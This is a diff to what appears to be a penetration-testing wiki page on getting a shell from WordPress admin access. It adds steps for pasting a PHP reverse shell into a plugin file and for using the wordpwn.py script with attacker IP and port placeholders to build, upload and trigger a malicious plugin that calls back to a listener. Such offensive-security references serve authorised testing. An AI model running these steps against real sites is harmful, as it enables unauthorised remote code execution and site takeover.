@@ -216,14 +216,42 @@ It may be possible to edit PHP from the theme used. For this;
   We should get the target shell in the netcat listener.
 {% endtab %}
 
-{% tab title="Malicious Plugin " %}
+{% tab title="Plugin Injection " %}
 It may be possible to upload .php files as a plugin. For this:
 
 * Access to dashboard (/wp-admin/).
 * Go to Plugins → Plugin Editor.
-* Upload the [Unix Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or the [Windows one](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php).
+* Insert [Unix Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or [Windows](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php) PHP code into the file (e.g. plugin\_name.php) and update $ip and $port.
 * Access "https://example.com/wp-content/plugins/\<plugin>/\<plugin>.php"\
-  We should get the target shell in the netcat listener.
+  We should get the target shell in our netcat listener.
+{% endtab %}
+
+{% tab title="Malicious Plugin " %}
+Alternatively, we can craft a malicious plugin and install it using the [malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) python script.
+
+```bash
+# Generate a malicious plugin and start a listener
+python wordpwn.py <ATTACKING_IP> <ATTACKING_PORT> Y
+
+# Just generate a malicious plugin
+python wordpwn.py <ATTACKING_IP> <ATTACKING_PORT> N
+```
+
+Then:
+
+* Access to dashboard (/wp-admin/).
+* Go to Plugins → Upload plugin. (/wp-admin/plugin-install.php?tab=upload)
+* Upload our generated plugin
+* Activate the plugin
+* Trigger the reverse shell by browsing one of the following url
+  * http://(target)/wp-content/plugins/malicious/wetw0rk\_maybe.php
+  * http://(target)/wp-content/plugins/malicious/QwertyRocks.php
+
+{% hint style="info" %}
+You may want to edit the code to change the msfvenom payload, plugin name, or URLs that trigger the reverse shell.&#x20;
+
+The **`malicious`** in the url, is defined by the zip file name.
+{% endhint %}
 {% endtab %}
 {% endtabs %}
 
